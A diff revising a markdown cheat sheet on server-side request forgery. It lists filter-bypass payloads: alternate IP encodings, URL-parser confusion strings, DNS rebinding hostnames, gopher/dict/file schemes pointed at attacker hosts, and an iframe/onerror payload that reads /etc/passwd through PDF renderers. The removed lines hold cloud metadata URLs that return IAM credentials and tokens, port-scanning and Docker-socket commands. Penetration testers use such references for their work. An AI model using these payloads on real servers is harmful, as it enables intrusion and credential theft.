@@ -1,27 +1,30 @@
-Server Side Request Forgery is a vulnerability in which an attacker forces a server to perform requests on their behalf.
+Server-side request forgery (or SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.
+
+In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.
 
 # Bypass filters
 
-Often applications block input containing non-whitelist hostname, sensitive URLs, or IP address like loopback, IPv4 link local, private address ([RFC1918](https://tools.ietf.org/html/rfc1918)), etc. In this situation, you can often bypass the filter using various techniques.
+Applications often block input containing non-whitelist hostnames, sensitive URLs, or IP addresses like loopback, IPv4 link-local, [private addresses](https://tools.ietf.org/html/rfc1918), etc. In this situation, it is sometimes possible to bypass the filter using various techniques.
 
 ## Redirection 
 
-You can try using redirection to the desired URL with a response with the code `3xx` and the URL in the `Location` header to bypass the filter as follows:
+You can try using a redirection to the desired URL to bypass the filter. To do this, return a response with the `3xx` code and the desired URL in the `Location` header to the request from the vulnerable server, for example:
 
 ```http
-HTTP/1.0 301 Moved Permanently
+HTTP/1.1 301 Moved Permanently
 Server: nginx
 Connection: close
 Content-Length: 0
 Location: http://127.0.0.1
 ```
 
-For redirection, you can use following approaches:
-- bash, like `nc -lvp 80 < response.txt`,
-- URL shortener services,
-- more flexible solutions, like simple HTTP server on python.
+You can achieve redirection in the following ways:
+- bash, like `nc -lvp 80 < response.txt`
+- URL shortener services
+- Mock and webhook services, see [here](/Resources/Researching/web-application.md#mocks-&-webhooks)
+- More flexible solutions such as a simple HTTP server on python
 
-If the application contains an open redirection vulnerability you can use it to bypass the URL filter as follows:
+Also, if the application contains an open redirection vulnerability you can use it to bypass the URL filter, for example:
 
 ```http
 POST /api/v1/webhook HTTP/1.1
@@ -32,12 +35,31 @@ Content-Length: 101
 url=https://vulnerable-website.com/api/v1/project/next?currentProjectId=1929851&path=http://127.0.0.1
 ```
 
-These bypass approaches work because the application can only validate for the provided URL, which causes the redirect. This follows the redirect and makes a request to the internal URL attacker's choosing.
+These bypass approaches work because the application only validates the provided URL, which triggers the redirect. It follows the redirect and makes a request to the internal URL of the attacker's choice.
 
-## Rare IP address
+## URL scheme
 
-Rare IP address formats defined in [RFC 3986](https://tools.ietf.org/html/rfc3986#section-7.4).
+You can try using different URL schemes to bypass the filter:
+```http
+file://path/to/file
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+dict://127.0.0.1:1337/stats
+ftp://127.0.0.1/
+sftp://attacker-website.com:1337/
+tftp://attacker-website.com:1337/TESTUDPPACKET
+ldap://127.0.0.1:389/%0astats%0aquit
+ldaps://127.0.0.1:389/%0astats%0aquit
+ldapi://127.0.0.1:389/%0astats%0aquit
+gopher://attacker-website.com/_SSRF%0ATest!
+```
 
+## IP address formats
+
+You can try using a different IP address format to bypass the filter.
+
+### Rare IP address
+
+Rare IP address formats, defined in [RFC 3986](https://tools.ietf.org/html/rfc3986#section-7.4):
 - Dotted hexadecimal IP: `0x7f.0x0.0x0.0x1`
 - Dotless hexadecimal IP: `0x7f001`
 - Dotless hexadecimal IP with padding: `0x0a0b0c0d7f000001` (padding is `0a0b0c0d`)
@@ -48,12 +70,12 @@ Rare IP address formats defined in [RFC 3986](https://tools.ietf.org/html/rfc398
 - Dotted octal IP with padding: `00177.000.0000.000001`
 - Combined:
 
-```http
-0x7f.0.1
-0x7f.1
-00177.1
-00177.0x0.1
-```
+    ```http
+    0x7f.0.1
+    0x7f.1
+    00177.1
+    00177.0x0.1
+    ```
 
 You can short-hand IP addresses by dropping the zeros:
 
@@ -68,40 +90,16 @@ You can short-hand IP addresses by dropping the zeros:
 127.0.1 => 127.0.0.1
 ```
 
-### Abusing a bug in Ruby's native resolver
-
-`Resolv::getaddresses` is OS-dependent, therefore by playing around with different IP formats one can return blank values. 
-
-Proof of concept:
-
-```ruby
-irb(main):001:0> require 'resolv'
-=> true
-irb(main):002:0> uri = "0x7f.1"
-=> "0x7f.1"
-irb(main):003:0> server_ips = Resolv.getaddresses(uri)
-=> [] # The bug!
-irb(main):004:0> blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
-=> ["127.0.0.1", "::1", "0.0.0.0"]
-irb(main):005:0> (blocked_ips & server_ips).any?
-=> false # Bypass
-```
-
-References:
-- [Bypassing Server-Side Request Forgery filters by abusing a bug in Ruby's native resolver](https://edoverflow.com/2017/ruby-resolv-bug/)
-- [Report: Blind SSRF in "Integrations" by abusing a bug in Ruby's native resolver](https://hackerone.com/reports/287245)
-- [Report: SSRF vulnerability in gitlab.com via project import](https://hackerone.com/reports/215105)
-
-## IPv6 addresses
+### IPv6 address
 
 - IPv6 localhost:
 
-```http
-[::]
-0000::1
-[::1]
-0:0:0:0:0:0:0:0
-```
+    ```http
+    [::]
+    0000::1
+    [::1]
+    0:0:0:0:0:0:0:0
+    ```
 
 - IPv4-mapped IPv6 address: `[::ffff:7f00:1]`
 - IPv4-mapped IPv6 address: `[::ffff:127.0.0.1]`
@@ -109,7 +107,7 @@ References:
 - IPv4-mapped IPv6 address with [zone identifier](https://tools.ietf.org/html/rfc6874): `[::ffff:7f00:1%25]`
 - IPv4-mapped IPv6 address with [zone identifier](https://tools.ietf.org/html/rfc6874): `[::ffff:127.0.0.1%eth0]`
 
-## Abusing enclosed alphanumerics
+### Abuse of enclosed alphanumerics
 
 Enclosed alphanumerics is a Unicode block of typographical symbols of an alphanumeric within a circle, a bracket or other not-closed enclosure, or ending in a full stop, q.v. [list](https://jrgraphix.net/r/Unicode/2460-24FF).
 
@@ -134,24 +132,48 @@ Enclosed alphanumerics is a Unicode block of typographical symbols of an alphanu
 ⓪𝟘𝟙𝟳𝟽｡𝟎𝓧₀｡𝟏
 ```
 
+## Abusing a bug in Ruby's native resolver
+
+`Resolv::getaddresses` is OS-dependent, therefore by playing around with different IP formats one can return blank values. 
+
+Proof of concept:
+
+```ruby
+irb(main):001:0> require 'resolv'
+=> true
+irb(main):002:0> uri = "0x7f.1"
+=> "0x7f.1"
+irb(main):003:0> server_ips = Resolv.getaddresses(uri)
+=> [] # The bug!
+irb(main):004:0> blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
+=> ["127.0.0.1", "::1", "0.0.0.0"]
+irb(main):005:0> (blocked_ips & server_ips).any?
+=> false # Bypass
+```
+
+References:
+- [Bypassing Server-Side Request Forgery filters by abusing a bug in Ruby's native resolver](https://edoverflow.com/2017/ruby-resolv-bug/)
+- [Report: Blind SSRF in "Integrations" by abusing a bug in Ruby's native resolver](https://hackerone.com/reports/287245)
+- [Report: SSRF vulnerability in gitlab.com via project import](https://hackerone.com/reports/215105)
+
 ## Broken parser
 
 The [URL specification](https://tools.ietf.org/html/rfc3986) contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validation of URLs:
-- Embedded credentials in a URL before the hostname, using the @ character: `https://expected-host@evil-host`
+- Embedded credentials in a URL before the hostname, using the `@` character: `https://expected-host@evil-host`
 - Indication a URL fragment using the `#` character: `https://evil-host#expected-host`
 - DNS naming hierarchy: `https://expected-host.evil-host`
 - URL-encode characters. This can help confuse URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
 - Combinations of these techniques together:
 
-```http
-foo@evil-host:80@expected-host
-foo@evil-host%20@expected-host
-evil-host%09expected-host
-127.1.1.1:80\@127.2.2.2:80
-127.1.1.1:80:\@@127.2.2.2:80
-127.1.1.1:80#\@127.2.2.2:80
-ß.evil-host
-```
+    ```http
+    foo@evil-host:80@expected-host
+    foo@evil-host%20@expected-host
+    evil-host%09expected-host
+    127.1.1.1:80\@127.2.2.2:80
+    127.1.1.1:80:\@@127.2.2.2:80
+    127.1.1.1:80#\@127.2.2.2:80
+    ß.evil-host
+    ```
 
 References:
 - [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/Server%20Side%20Request%20Forgery/materials/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
@@ -190,9 +212,9 @@ See more [1u.ms](http://1u.ms)
 
 ## DNS rebinding
 
-Often applications implement IP address verification, for example, that it is not loopback, IPv4 link local, private address ([RFC1918](https://tools.ietf.org/html/rfc1918)), etc. If the mechanisms for checking and establishing a connection are independent and there is no caching of the DNS resolution response, you can bypass this by controlling the DNS resolution response.
+If the mechanisms in vulnerable application for checking and establishing a connection are independent and there is no caching of the DNS resolution response, you can bypass this by manipulating the DNS resolution response.
 
-For example, if two requests go one after another, for 5 seconds, with DNS resolution `make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms` the first DNS query, the address `1.1.1.1` will be returned, and to the second` 127.0.0.1`.
+For example, if two requests go one after the other within 5 seconds, DNS resolution `make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms` will return the address `1.1.1.1` by the first request, and the second - `127.0.0.1`.
 
 ```bash
 $ dig A make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms
@@ -204,336 +226,30 @@ make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms. 0 IN A 127.0.0.1
 
 See more [1u.ms](http://1u.ms)
 
-# Credentials bruteforce
+# FFmpeg 
 
-SSRF allows you to bruteforce credentials for resources that use Basic access authentication as an authentication mechanism. To do this, just create a following link:
-
-```http
-http://login:password@target-website.com/path/
-```
-
-# Responses anomaly
-
-Sometimes you can rely on an anomaly of answers when using SSRF, if the response of request execution is not available to you. To do this, you need to access internal resources and measure the response time for each request. Response time is an indirect sign that may indicate the availability of a resource. Having sent a lot of requests, you need to search among them those for which the response time is different from all the others. This approach allows you to blindly bruteforce internal services, open ports, directories and files.
-
-# Port scanning using DNS
-
-Many libraries try to access the resource by IP in the order that they are placed in DNS records. For example, if the
- DNS records look like this:
-
-```
-site.com 172.16.1.1
-site.com 172.16.1.2
-```
-
-first there will be an attempted connect to `172.16.1.1`, and if problems arise, to `172.16.1.2`. This allows you to find out which ports are open and which are not.
-
-For this you can also use the service `http://1u.ms`. For example, if you need to find available ports on `127.0.0.1`, you can use
-
-```
-make-127-0-0-1-and-123-123-123-123rr.1u.ms
-```
-
-this will allow you to change the port number to determine which port is available.
-
-```
-http://make-127-0-0-1-and-123-123-123-123rr.1u.ms:22 - request did not come to 123.123.123.123:22
-http://make-127-0-0-1-and-123-123-123-123rr.1u.ms:80 - request came to 123.123.123.123:80
-http://make-127-0-0-1-and-123-123-123-123rr.1u.ms:6379 - request did not come to 123.123.123.123:6379
-http://make-127-0-0-1-and-123-123-123-123rr.1u.ms:8080 - request came to 123.123.123.123:8080
-```
-
-This shows that ports `22` and `6379` are open on `127.0.0.1` because there were no connection attempts for the IP address from the second DNS record.
-
-> It is worth paying attention to what DNS server resolves names on the backend side. DNS server can use the built-in round robin algorithm for resolving domain names and change the order of records
-
-# Exploitation via URL scheme & protocols
-
-## File
-
-`file` scheme allows you to fetch the content of a file on the server:
-
-```
-file://path/to/file
-file:///etc/passwd
-file://\/\/etc/passwd
-```
-
-## HTTP
-
-`http` scheme allows you to fetch any content from the web, it can also be used to scan ports:
-
-```
-http://127.0.0.1:80
-http://127.0.0.1:22
-http://127.0.0.1:6379
-```
-
-## Dict
-
-`dict` scheme is used to refer to definitions or word lists available using the dict protocol:
-
-```
-dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
-```
-
-## SFTP
-
-SFTP is a network protocol used for secure file transfer over secure shell:
-
-```
-sftp://evil-host:1337/
-```
-
-## SMTP
-
-When connected to SMTP, internal domains may leak from the first line:
-
-1. Connect on SMTP: `localhost:25`
-2. From the first line get the internal domain name: `220 http://subdomain.internal-host ESMTP Sendmail`
-3. Search subdomains, for example, on github
-4. Connect
-
-References:
-- [Twitter source post](https://twitter.com/har1sec/status/1182255952055164929)
-
-## TFTP
-
-TFTP or trivial file transfer protocol, works over UDP:
-
-```
-tftp://evil-host:1337/TESTUDPPACKET
-```
-
-## LDAP
-
-LDAP is an application protocol used over an IP network to manage and access the distributed directory information service:
-
-```
-ldap://127.0.0.1:389/%0astats%0aquit
-```
-
-## Gopher
-
-Gopher is a communications protocol designed for distributing, searching, and retrieving documents, see [more](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#gopher).
-
-# Cloud
-
-## Amazon Web Services
-
-{% embed url="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" %}
-
--  No header required.
-
-```
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/user-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
-http://169.254.169.254/latest/user-data/iam/security-credentials/<role-name>
-http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
-http://169.254.169.254/latest/meta-data/ami-id
-http://169.254.169.254/latest/meta-data/reservation-id
-http://169.254.169.254/latest/meta-data/hostname
-http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
-http://169.254.169.254/latest/meta-data/public-keys/<id>/openssh-key
-```
-
-{% embed url="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html" %}
-
-- No header required.
-
-```
-http://169.254.170.2/v2/metadata
-http://169.254.170.2/v2/stats
-http://169.254.170.2/v2/metadata/<container-id>
-http://169.254.170.2/v2/stats/<container-id>
-http://169.254.170.2/v2/credentials/
-```
-
-## Google Cloud
-
-{% embed url="https://cloud.google.com/compute/docs/metadata" %}
-
-- Requires the header `Metadata-Flavor: Google` or `X-Google-Metadata-Request: True` on API v1,
-- Most endpoints can be accessed via the v1beta API without a header.
-
-```
-http://169.254.169.254/computeMetadata/v1/
-http://metadata.google.internal/computeMetadata/v1/
-http://metadata/computeMetadata/v1/
-http://metadata.google.internal/computeMetadata/v1/instance/hostname
-http://metadata.google.internal/computeMetadata/v1/instance/id
-http://metadata.google.internal/computeMetadata/v1/project/project-id
-# Google allows recursive pulls 
-http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
-# Root password for Google
-http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json
-# kube-env: https://hackerone.com/reports/341876
-http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
-# SSH Public Key
-http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
-# Get Access Token
-http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
-```
-
-## Digital Ocean
-
-{% embed url="https://developers.digitalocean.com/documentation/metadata/" %}
-
-- No header required.
-
-```
-http://169.254.169.254/metadata/v1.json
-http://169.254.169.254/metadata/v1/ 
-http://169.254.169.254/metadata/v1/id
-http://169.254.169.254/metadata/v1/user-data
-http://169.254.169.254/metadata/v1/hostname
-http://169.254.169.254/metadata/v1/region
-http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
-```
-
-## Packet Cloud
-
-{% embed url="https://www.packet.com/developers/docs/servers/key-features/metadata/" %}
-
-- No header required.
-
-```
-https://metadata.packet.net/metadata
-```
-
-## Microsoft Azure
-
-{% embed url="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service" %}
-
-- Requires the header `Metadata: true`.
-
-```
-http://169.254.169.254/metadata/instance
-http://169.254.169.254/metadata/instance?api-version=2018-10-01
-http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2018-10-01&format=text
-http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
-```
-
-## Alibaba Cloud
-
-{% embed url="https://www.alibabacloud.com/help/doc-detail/49122.htm" %}
-
-- No header required.
-
-```
-http://100.100.100.200/latest/meta-data/
-http://100.100.100.200/latest/meta-data/instance-id
-http://100.100.100.200/latest/meta-data/image-id
-```
-
-## OpenStack
-
-{% embed url="https://docs.openstack.org/nova/latest/user/metadata.html" %}
-
-- No required header.
-
-```
-http://169.254.169.254/openstack
-http://169.254.169.254/openstack/2018-08-27/meta_data.json
-http://169.254.169.254/openstack/2018-08-27/network_data.json
-http://169.254.169.254/openstack/2018-08-27/user_data
-# EC2-compatible metadata
-http://169.254.169.254/2009-04-04/meta-data/
-http://169.254.169.254/2009-04-04/meta-data/public-keys/
-http://169.254.169.254/2009-04-04/meta-data/public-keys/0/openssh-key
-```
-
-## Oracle Cloud
-
-{% embed url="https://docs.oracle.com/en/cloud/iaas/compute-iaas-cloud/stcsg/retrieving-instance-metadata.html" %}
-
-- No header required.
-
-```
-http://192.0.0.192/latest/
-http://192.0.0.192/latest/user-data/
-http://192.0.0.192/latest/meta-data/
-http://192.0.0.192/latest/attributes/
-```
-
-{% embed url="https://docs.cloud.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm" %}
-
-- No header required.
-
-```
-http://169.254.169.254/opc/v1/instance/
-```
-
-# Kubernetes
-
-```
-# Debug Services https://kubernetes.io/docs/tasks/debug-application-cluster/debug-service/
-https://kubernetes.default.svc.cluster.local
-https://kubernetes.default
-# https://twitter.com/Random_Robbie/status/1072242182306832384
-https://kubernetes.default.svc/metrics
-```
-
-Kubernetes [etcd API](https://etcd.io/docs/v2/api/) can contain API keys, internal IPs and ports:
-
-```bash
-$ curl -L http://127.0.0.1:2379/version
-$ curl http://127.0.0.1:2379/v2/keys/?recursive=true
-```
-
-# Docker
-
-```
-http://127.0.0.1:2375/v1.24/containers/json
-```
-
-Simple example:
-
-```bash
-$ docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
-bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
-bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
-```
-
-References:
-- [dockerd - Daemon socket option](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option)
-- [Docker Engine API](https://docs.docker.com/engine/api/v1.40/)
-
-# SVG
-
-{% embed url="https://github.com/allanlw/svg-cheatsheet" %}
-
-# ffmpeg 
-
-References:
 - [Viral Video Exploiting Ssrf In Video Converters](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/Server%20Side%20Request%20Forgery/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf)
 - [Attacks on video converters: a year later](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/Server%20Side%20Request%20Forgery/materials/phdays-ffmpeg.pdf)
 - [Report: SSRF and local file disclosure in https://wordpress.com/media/videos/ via FFmpeg HLS processing](https://hackerone.com/reports/237381)
 - [Report: SSRF / Local file enumeration / DoS due to improper handling of certain file formats by ffmpeg](https://hackerone.com/reports/115978)
 - [Tool: ffmpeg-avi-m3u-xbin](https://github.com/neex/ffmpeg-avi-m3u-xbin)
 
-# iframe
+# SVG
 
-`iframe` allow you read internal files:
+{% embed url="https://github.com/allanlw/svg-cheatsheet" %}
+
+# Server-side processing of arbitrary HTML and JS 
+
+Server-side processing of arbitrary HTML and JS data from the user can often be found when generating various documents, for example, in PDF format. If this functionality is vulnerable to HTML injection and/or XSS, you can try using this to access internal resources:
 
 ```html
 <iframe src="file:///etc/passwd" width="400" height="400">
+<img src onerror="document.write('<iframe src=//127.0.0.1></iframe>')">
 ```
 
 References:
-- [Report: Blind SSRF/XSPA on dashboard.lob.com + blind code injection](https://hackerone.com/reports/517461)
-
-# PDFs rendering
-
-If the web page is automaticaly creating a PDF with some information you have provided, you can insert some JS that will be executed by the PDF creator itself (the server) while creating the PDF. Then, if you insert an iframe trying to load the content of the cloud metadata, the served pdf will contain the results of that iframe.
-
-References:
 - [Write up: Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
-
-# DoS
-
-Create several sessions and try to download heavy files exploiting the SSRF from the sessions.
+- [Report: Blind SSRF/XSPA on dashboard.lob.com + blind code injection](https://hackerone.com/reports/517461)
 
 # Request splitting
 
@@ -541,16 +257,16 @@ Create several sessions and try to download heavy files exploiting the SSRF from
 
 # Referer header
 
-Some applications employ server-side analytics software that tracks visitors. This software often logs the Referer header in requests, since this is of particular interest for tracking incoming links. Often the analytics software will actually visit any third-party URL that appears in the Referer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header often represents fruitful attack surface for SSRF vulnerabilities.
+Some applications employ server-side analytics software that tracks visitors. This software often logs the `Referer` header in requests, since this is of particular interest for tracking incoming links.
+
+Often the analytics software will actually visit any third-party URL that appears in the `Referer` header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the `Referer` header often represents fruitful attack surface for SSRF vulnerabilities.
 
 # References
 
 - [Web Security Academy: Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
 - [Blind SSRF exploitation](https://lab.wallarm.com/blind-ssrf-exploitation/)
 - [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
-- [Write up: SSRF in CI after first run](https://hackerone.com/reports/369451)
-- [Write up: GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery](https://hackerone.com/reports/541169)
+- [Report: SSRF in CI after first run](https://hackerone.com/reports/369451)
+- [Report: GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery](https://hackerone.com/reports/541169)
 - [Report: Gitlab DNS rebinding protection bypass](https://hackerone.com/reports/632101)
 - [Write up: How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
-- [Write up: GitLab 11.4.7 Remote Code Execution](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)
-- [Tool: SSRF Proxy](https://github.com/bcoles/ssrf_proxy)
